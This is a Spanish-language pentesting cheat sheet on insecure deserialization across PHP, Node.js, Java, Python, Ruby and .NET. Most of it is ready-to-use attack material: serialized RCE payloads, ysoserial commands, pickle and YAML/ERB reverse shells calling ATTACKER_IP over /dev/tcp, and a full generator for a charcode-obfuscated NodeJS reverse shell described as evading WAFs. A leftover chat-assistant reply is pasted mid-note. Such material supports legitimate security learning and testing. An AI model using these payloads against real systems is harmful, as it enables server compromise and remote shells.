## 📚 **Índice

- [[#📚 1. Qué es la deserialización y por qué es peligrosa]]
- [[#🧠 2. Cómo funciona el ataque (explicado como hacker, no como un libro)]]
- [[#🔥 3. Por qué ocurre: encapsulamiento roto]]
- [[#⚙️ 4. PHP Deserialization (el clásico exploit)]]
- [[#⚙️ 5. Node.js Deserialization (más común de lo que parece)]]
- [[#🧵 6. Man-in-the-Middle para modificar objetos en tránsito]]
- [[#🔎 7. Por qué es difícil explotarlo a ciegas]]
- [[#🚨 8. Indicadores de que una app es vulnerable]]
- [[#🔥 9. Cómo explotar si ves objetos con atributos públicos]]
- [[#🛡️ 10. Cómo defender (solo para que entiendas cómo romperlo mejor)]]
- [[#🎯 **11. Resumen en una línea **]]
- [[#⚡ 12. Plantilla PRO para Exploit (Burp)]]
- [[#🧨 13. Payloads PRO de Deserialización en Lenguajes Adicionales]]
    - [[#13.1 Java — Payloads ysoserial (RCE real)]]
    - [[#13.2 Java — Payload manual (sin ysoserial)]]
    - [[#13.3 Python — Pickle RCE]]
    - [[#13.4 Python — Payload alternativo (reverse shell)]]
    - [[#13.5 Ruby — YAML.load (RCE automático)]]
    - [[#13.6 Ruby — Reverse Shell]]
    - [[#13.7 .NET — BinaryFormatter (RCE con gadget Chains)]]
    - [[#13.8 .NET — Gadget simple (si tienes acceso al código)]]
- [[#🐍 14. Generador Python para Reverse Shell NodeJS (codificada en CharCode)]]
    - [[#14.1 Código del Generador (Python)]]
    - [[#14.2 Ejecución rápida]]
    - [[#14.3 Por qué funciona contra deserialización en Node]]


---

## 📚 **1. Qué es la deserialización y por qué es peligrosa**

La **serialización** convierte un objeto de un lenguaje POO (PHP, Java, Python, Node.js, etc.) en **bytes** para enviarlo por red o almacenarlo.

La **deserialización** hace lo contrario:  
toma esos bytes → los convierte de nuevo en un objeto real.

💀 **El problema:**  
Si el atacante puede **modificar** esos bytes antes de que se deserialicen, puede:

- cambiar atributos internos del objeto
    
- activar funciones internas del sistema
    
- romper la lógica de seguridad
    
- **ejecutar código arbitrario (RCE)** en el servidor
    

Esto convierte los ataques de deserialización en una de las vulnerabilidades más críticas del mundo real.

---

## 🧠 **2. Cómo funciona el ataque (explicado como hacker, no como un libro)**

Un objeto viaja por la red **serializado**:  
cookies, parámetros, POST request, cabeceras, JSON extraño, etc.

Ejemplo conceptual:

1. Cliente envía:
    

```
O:8:"UserObj":2:{s:8:"isAdmin";b:0;s:5:"name";s:5:"daniel";}
```

2. El servidor lo deserializa sin verificarlo:
    

```php
unserialize($_POST["user"]);
```

3. Tú reemplazas `isAdmin` → `1`  
    Ahora eres admin en la aplicación.
    

---

## 🔥 **3. Por qué ocurre: encapsulamiento roto**

En POO se supone:

- Los atributos sensibles deben ser **private**
    
- El acceso debe pasar por **getters/setters**
    
- La lógica debe validarse internamente
    

Pero muchas apps hacen cosas como esto en PHP:

```php
class PingTest {
    public $ipaddress = "127.0.0.1";
    public $isValid = true;
}
```

Y luego:

```php
unserialize($_COOKIE["data"]);
```

💀 **Todo públicoooo**  
→ CUALQUIERA puede cambiar `isValid` o cualquier atributo sensible desde fuera.

---

## ⚙️ **4. PHP Deserialization (el clásico exploit)**

### 🎯 Ejemplo real

```php
class PingTest {
    public $ipaddress = "127.0.0.1";
    public $isvalid = true;
}

echo urlencode(serialize(new PingTest));
```

Tú interceptas ese valor en Burp, lo modificas:

```
O:8:"PingTest":2:{s:9:"ipaddress";s:21:";system('id');//";s:7:"isvalid";b:1;}
```

Si dentro de la clase hay un método mágico como:

- `__destruct()`
    
- `__wakeup()`
    
- `__toString()`
    
- `__call()`
    

El servidor puede ejecutar **código arbitrario**.

---

## ⚙️ **5. Node.js Deserialization (más común de lo que parece)**

Node no usa serialize/unserialize nativos, pero hay dos escenarios:

### **1. Objetos JSON que se convierten directamente en objetos internos**

Si la app hace:

```js
let user = JSON.parse(input);
```

y luego usa librerías vulnerables como `node-serialize`.

Ejemplo típico:

```
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id') }()"}
```

Esto usa un IIFE (Immediately Invoked Function Expression) para ejecutar RCE.

💡 **Pro tip:**  
En Internet hay un payload famoso publicado en OPSECX que convierte cualquier objeto JS en versión serializable compatible con el parser vulnerable. Ese payload + Burp → **RCE directo**.

---

## 🧵 **6. Man-in-the-Middle para modificar objetos en tránsito**

Deserialización se vuelve fatal cuando:

- El objeto **viaja por la red**
    
- Puedes **interceptarlo con Burp**
    
- Puedes **cambiar atributos privados/públicos**
    
- La app lo deserializa **sin validación**
    

Ejemplo:

```
isValid = false → true
role = "user" → "admin"
limit = 10 → 9999999
verified = false → true
```

---

## 🔎 **7. Por qué es difícil explotarlo a ciegas**

Si no sabes cómo es el objeto real, no sabes cómo serializa:

- PHP usa formato propio
    
- Python usa pickle
    
- Java usa ObjectInputStream
    
- Node usa librerías inseguras
    
- Ruby usa YAML (a veces RCE directo)
    

Sin un “backup” (el objeto original), es difícil reconstruir la estructura correcta.

Pero si la app es **open source**, todo se vuelve trivial.

---

## 🚨 **8. Indicadores de que una app es vulnerable**

Busca:

- `unserialize()` en PHP
    
- `pickle.loads()` o `load()` en Python
    
- `YAML.load()` en Ruby
    
- `node-serialize` o parsers raros en Node
    
- Objetos completos viajando en cookies
    
- Tokens enormes que no parecen JWT
    
- Parámetros con forma de objetos serializados (`O:x:{...}`)
    

---

## 🔥 **9. Cómo explotar si ves objetos con atributos públicos**

En Burp modificas:

```
s:7:"isvalid";b:0;
```

→ lo cambias a:

```
s:7:"isvalid";b:1;
```

Si hay métodos mágicos + sinks peligrosos (log, exec, curl, file include…), consigues:

- Escalada de privilegios
    
- Bypass de seguridad
    
- RCE completa
    

---

## 🛡️ **10. Cómo defender (solo para que entiendas cómo romperlo mejor)**

- No usar deserialización insegura
    
- Validar que el input provenga de fuentes confiables
    
- Usar formatos seguros: JSON, Protobuf
    
- Convertir atributos sensibles a **private**
    
- Evitar métodos mágicos peligrosos
    
- Firmar los objetos serializados con HMAC
    

---

## 🎯 **11. Resumen en una línea :**

> **Un ataque de deserialización es cuando interceptas un objeto que viaja por la red, lo modificas y haces que el servidor lo recree con los nuevos valores → control total.**

---

## ⚡ **12. Plantilla PRO para Exploit (Burp)**

```
Capturar → Ver si parece un objeto → serializar payload → modificar atributos → enviar → buscar métodos mágicos → escalar → RCE.
```

---

# 🧨 **13. Payloads PRO de Deserialización en Lenguajes Adicionales**

---

## 13.1 **Java — Payloads ysoserial (RCE real)**

Java es **el rey de la deserialización peligrosa**.  
Si ves algo como:

```
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
ois.readObject();
```

→ **Game over**.

### ✔️ Payloads con ysoserial (RCE directo)

Para ejecutar un comando:

```
java -jar ysoserial.jar CommonsCollections1 "bash -c 'id'" | base64
```

Otros gadgets útiles:

```
CommonsCollections1
CommonsCollections3
CommonsCollections4
CommonsCollections5
JRMPClient
Jdk7u21
```

Ejemplo para Windows:

```
java -jar ysoserial.jar CommonsCollections5 "cmd.exe /c whoami"
```

Enviar por Burp como parámetro serializado (muchas veces en Base64).

---

## 13.2 **Java — Payload manual (sin ysoserial)**

Si la app acepta objetos simples:

```java
import java.io.*;
public class Exploit implements Serializable {
    private void readObject(ObjectInputStream ois) throws Exception {
        ois.defaultReadObject();
        Runtime.getRuntime().exec("bash -c id");
    }
}
```

Luego serializas:

```
javac Exploit.java
java Exploit > payload.bin
```

Y envías `payload.bin`.

---

## 13.3 **Python — Pickle RCE**

Si ves:

```python
pickle.loads(data)
```

→ **es RCE automático**.

### ✔️ Payload Pickle para ejecutar comandos

```python
import pickle
import os

class RCE(object):
    def __reduce__(self):
        return (os.system, ("id",))

print(pickle.dumps(RCE()))
```

Para Python3, convertir a Base64:

```python
python3 exploit.py | base64
```

Enviar por Burp → Shell.

---

## 13.4 **Python — Payload alternativo (reverse shell)**

```python
import pickle
import subprocess

class X(object):
    def __reduce__(self):
        cmd = ("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'",)
        return (subprocess.call, cmd)

print(pickle.dumps(X()))
```

---

## 13.5 **Ruby — YAML.load (RCE automático)**

Si la app hace:

```ruby
YAML.load(params[:data])
```

→ **RCE instantáneo**.

### ✔️ Payload real:

```yaml
--- !ruby/object:Gem::Installer
i: x
development: false
security_policy:
  verify_signer: !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Tempfile {}
    debug_output: &1
```

Más fácil:

```yaml
--- !ruby/object:ERB
src: "<%= `id` %>"
```

---

## 13.6 **Ruby — Reverse Shell**

```yaml
--- !ruby/object:ERB
src: "<%= `bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'` %>"
```

---

## 13.7 **.NET — BinaryFormatter (RCE con gadget Chains)**

Si ves:

```csharp
BinaryFormatter bf = new BinaryFormatter();
object o = bf.Deserialize(stream);
```

→ Vulnerable.

### ✔️ Payload real usando YSoSerial.NET:

```
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "calc.exe"
```

Ejecuta calc.exe → se demuestra RCE.

En Linux (mono):

```
mono ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "bash -c id"
```

---

## 13.8 **.NET — Gadget simple (si tienes acceso al código)**

```csharp
[Serializable]
public class Exploit {
    public Exploit() {
        System.Diagnostics.Process.Start("calc.exe");
    }
}
```

Serializar:

```csharp
BinaryFormatter bf = new BinaryFormatter();
bf.Serialize(File.OpenWrite("payload.bin"), new Exploit());
```

Enviar → Boom.

---

Perfecto.  
Aquí tienes **una sección PRO lista para agregar a tu nota**, con título alineado al estilo de tus encabezados, **sin romper tu índice**, sin inventar nada, y con el código limpio.

Además te pongo el **encabezado EXACTO** que necesitas para que funcione tu índice interno si después decides incluir esta sección en él.

---

# 🐍 **14. Generador Python para Reverse Shell NodeJS (codificada en CharCode)**

Este script genera un **NodeJS reverse shell** codificado mediante `String.fromCharCode()` para evadir filtros en aplicaciones vulnerables a **deserialización en Node**, especialmente en ataques contra `node-serialize`, `JSON.parse()` inseguro o IIFE mal desinfectados.

Es extremadamente útil cuando necesitas:

- esconder un payload dentro de un objeto serializado,
    
- evadir WAFs o validadores JSON débiles,
    
- ejecutar RCE en aplicaciones Node vulnerables.
    

---

## **14.1 Código del Generador (Python)**

📌 _Compatible con Python 2.7 (como el original), pero puede adaptarse a Python 3._

```
#!/usr/bin/python
# Generator for encoded NodeJS reverse shells
# Based on the NodeJS reverse shell by Evilpacket
# https://github.com/evilpacket/node-shells/blob/master/node_revshell.js
# Onelineified and suchlike by infodox (and felicity, who sat on the keyboard)
# Insecurety Research (2013) - insecurety.net

import sys

if len(sys.argv) != 3:
    print "Usage: %s <LHOST> <LPORT>" % (sys.argv[0])
    sys.exit(0)

IP_ADDR = sys.argv[1]
PORT = sys.argv[2]


def charencode(string):
    """String.CharCode"""
    encoded = ''
    for char in string:
        encoded = encoded + "," + str(ord(char))
    return encoded[1:]

print "[+] LHOST = %s" % (IP_ADDR)
print "[+] LPORT = %s" % (PORT)

NODEJS_REV_SHELL = '''
var net = require('net');
var spawn = require('child_process').spawn;
HOST="%s";
PORT="%s";
TIMEOUT="5000";
if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
function c(HOST,PORT) {
    var client = new net.Socket();
    client.connect(PORT, HOST, function() {
        var sh = spawn('/bin/sh',[]);
        client.write("Connected!\\n");
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        sh.on('exit',function(code,signal){
          client.end("Disconnected!\\n");
        });
    });
    client.on('error', function(e) {
        setTimeout(c(HOST,PORT), TIMEOUT);
    });
}
c(HOST,PORT);
''' % (IP_ADDR, PORT)

print "[+] Encoding"
PAYLOAD = charencode(NODEJS_REV_SHELL)
print "eval(String.fromCharCode(%s))" % (PAYLOAD)
```

---

## **14.2 Ejecución rápida**

```
python revgen.py 10.10.14.2 4444
```

Salida típica:

```
[+] LHOST = 10.10.14.2
[+] LPORT = 4444
eval(String.fromCharCode(118,97,114,32,110,101,116, ... ))
```

Pegas ese resultado en:

- un campo vulnerable,
    
- un objeto serializado,
    
- o un gadget RCE de Node.
    

Boom — **reverse shell sin filtros**.

---

## **14.3 Por qué funciona contra deserialización en Node**

El payload final:

```
eval(String.fromCharCode(...))
```

evade:

- filtros de caracteres peligrosos (`<`, `>`, `'`, `"`, `(`, `)`)
    
- validaciones superficiales de JSON
    
- sanitizaciones parciales
    
- comparaciones substring
    

Y como muchas librerías de deserialización evalúan contenido internamente, este payload puede ejecutar código incluso cuando la app “valida” strings.

---
